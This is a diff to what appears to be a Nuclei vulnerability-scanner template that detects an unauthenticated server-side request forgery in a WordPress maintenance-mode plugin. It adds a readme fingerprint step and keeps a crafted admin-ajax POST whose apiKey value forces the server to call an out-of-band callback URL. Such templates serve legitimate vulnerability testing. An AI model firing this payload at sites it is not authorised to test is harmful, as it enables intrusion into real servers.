@@ -1,4 +1,5 @@
 id: wp-under-construction-ssrf
+
 info:
   name: Under Construction, Coming Soon & Maintenance Mode < 1.1.2 - Server Side Request Forgery (SSRF)
   author: Akincibor
@@ -10,8 +11,23 @@ info:
     - https://packetstormsecurity.com/files/161576/
   metadata:
     verified: true
-  tags: ssrf,wp,wp-plugin,wordpress,unauth
-requests:
+    max-request: 1
+  tags: ssrf,wp,wp-plugin,wordpress,unauth,wpscan,packetstorm
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/under-construction-maintenance-mode/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - '= Under Construction'
+
   - raw:
       - |
         POST /wp-admin/admin-ajax.php HTTP/2
@@ -20,8 +36,10 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D
+
     matchers:
       - type: word
         part: interactsh_protocol # Confirms the HTTP Interaction
         words:
           - "http"
+# digest: 4a0a0047304502210082b510222fd5b49a69b18aa179ea85b5852cdd988f15a0dea2c79e1cc97485a9022019b791003b9dbbdd08dc13ae2635f0320fdf833b3b9281969444907d82612bf7:922c64590222798bb761d5b6d8e72950
